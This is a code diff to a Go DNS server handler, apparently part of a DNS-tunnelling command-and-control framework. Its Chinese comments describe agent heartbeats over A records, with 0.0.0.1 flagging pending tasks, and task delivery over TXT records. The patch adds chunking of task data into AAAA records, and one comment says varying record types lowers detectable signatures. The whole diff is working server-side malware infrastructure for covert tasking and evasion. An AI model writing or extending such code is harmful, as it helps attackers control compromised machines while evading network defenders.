@@ -167,7 +167,12 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 	// Use math/rand (global instance is safe enough here)
 	ttl := baseTTL + uint32(rand.Intn(60))
 
-	qtype := strings.ToUpper(d.Config.QType)
+	// Determine response type based on the REQUEST's Qtype, not just the config.
+	// This fixes the bug where an A-record heartbeat received a TXT response.
+	reqQType := dns.TypeTXT // default
+	if len(r.Question) > 0 {
+		reqQType = r.Question[0].Qtype
+	}
 
 	for _, q := range r.Question {
 		labels := dns.SplitDomainName(q.Name)
@@ -301,10 +306,10 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				}
 			}
 			// ACK：返回一个最小响应（不同 QType 返回不同 RR，以降低特征）
-			if qtype == "A" {
+			if reqQType == dns.TypeA {
 				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("127.0.0.1").To4()}
 				m.Answer = append(m.Answer, rr)
-			} else if qtype == "AAAA" {
+			} else if reqQType == dns.TypeAAAA {
 				rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::1").To16()}
 				m.Answer = append(m.Answer, rr)
 			} else {
@@ -380,7 +385,7 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			var frame []byte
 
 			// 如果是 A 记录心跳请求：不返回数据，只返回 flag IP (0.0.0.1 有任务, 0.0.0.0 无任务)
-			if qtype == "A" {
+			if reqQType == dns.TypeA {
 				hasTasks := (df != nil && df.off < df.total)
 				if hasTasks {
 					// 有任务 -> 返回 0.0.0.1，通知 Agent 切换 TXT 拉取
@@ -436,12 +441,54 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				// 生成 TXT 响应
 				if len(frame) == 0 {
 					// 空 TXT 响应
-					rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{""}}
-					m.Answer = append(m.Answer, rr)
+					if reqQType == dns.TypeA { // Should be handled above, but for safety
+						rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
+						m.Answer = append(m.Answer, rr)
+					} else if reqQType == dns.TypeAAAA {
+						rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::").To16()}
+						m.Answer = append(m.Answer, rr)
+					} else {
+						rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{""}}
+						m.Answer = append(m.Answer, rr)
+					}
 				} else {
 					// 有数据 TXT 响应
-					rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{string(frame)}}
-					m.Answer = append(m.Answer, rr)
+					if reqQType == dns.TypeA {
+						// This path should NOT be reached given the logic above (A record handled separately)
+						// But if we forced frame generation for A, we would chunk it here.
+						// Since we use 0.0.0.1 signaling, this block is effectively dead code for A,
+						// but we keep it for structure.
+					} else if reqQType == dns.TypeAAAA {
+						// Similar to A, if AAAA used for data transport
+						start := 0
+						maxBytes := d.Config.PktSize
+						if maxBytes%16 != 0 {
+							maxBytes = maxBytes - (maxBytes % 16)
+						}
+						if maxBytes <= 0 {
+							maxBytes = 16
+						}
+						endLimit := start + maxBytes
+						if endLimit > len(frame) {
+							endLimit = len(frame)
+						}
+						for start < endLimit {
+							end := start + 16
+							if end > endLimit {
+								end = endLimit
+							}
+							chunk := make([]byte, 16)
+							copy(chunk, frame[start:end])
+							ip := net.IP(chunk)
+							rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: ip}
+							m.Answer = append(m.Answer, rr)
+							start = end
+						}
+					} else {
+						// TXT: 直接用 frame 构造单条 TXT 记录
+						rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{string(frame)}}
+						m.Answer = append(m.Answer, rr)
+					}
 				}
 			}
 			// GET 处理结束，break switch
